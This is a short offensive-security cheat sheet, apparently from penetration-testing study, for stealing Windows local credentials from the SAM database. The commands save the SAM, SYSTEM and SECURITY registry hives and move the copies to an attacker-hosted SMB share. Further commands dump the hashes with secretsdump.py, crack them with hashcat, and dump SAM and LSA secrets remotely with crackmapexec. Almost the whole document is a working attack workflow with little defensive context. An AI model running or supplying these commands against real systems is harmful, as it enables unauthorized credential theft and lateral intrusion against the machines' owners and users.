Attacking SAM


Registrive Hive

hklm\sam 	Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.
hklm\system 	Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
hklm\security 	Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.

____________________________________________________________________________________________________________________

Using reg.exe save to Copy Registry Hives

reg.exe save   <Registrive Hive>  <path_to_save>		--> It will save the files in desired location

____________________________________________________________________________________________________________________

Creating a Share with smbserver.py

smbserver.py -smb2support Share_name <path_to_save_in_kali>

____________________________________________________________________________________________________________________

Moving Hive Copies to Share

move <file_name? \\\\<IP>\\Share_name

____________________________________________________________________________________________________________________

Dumping Hashes with Impacket's secretsdump.py

secretsdump.py -sam <sam_file> -security <security_file> -system <system_file> LOCAL		--> security file is optional

____________________________________________________________________________________________________________________

Cracking Hashes with Hashcat

sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

____________________________________________________________________________________________________________________

Dumping LSA Secrets Remotely

crackmapexec smb <IP> --local-auth -u <username> -p <password> --lsa

____________________________________________________________________________________________________________________

Dumping SAM Remotely

crackmapexec smb <IP> --local-auth -u <username> -p <password> --sam
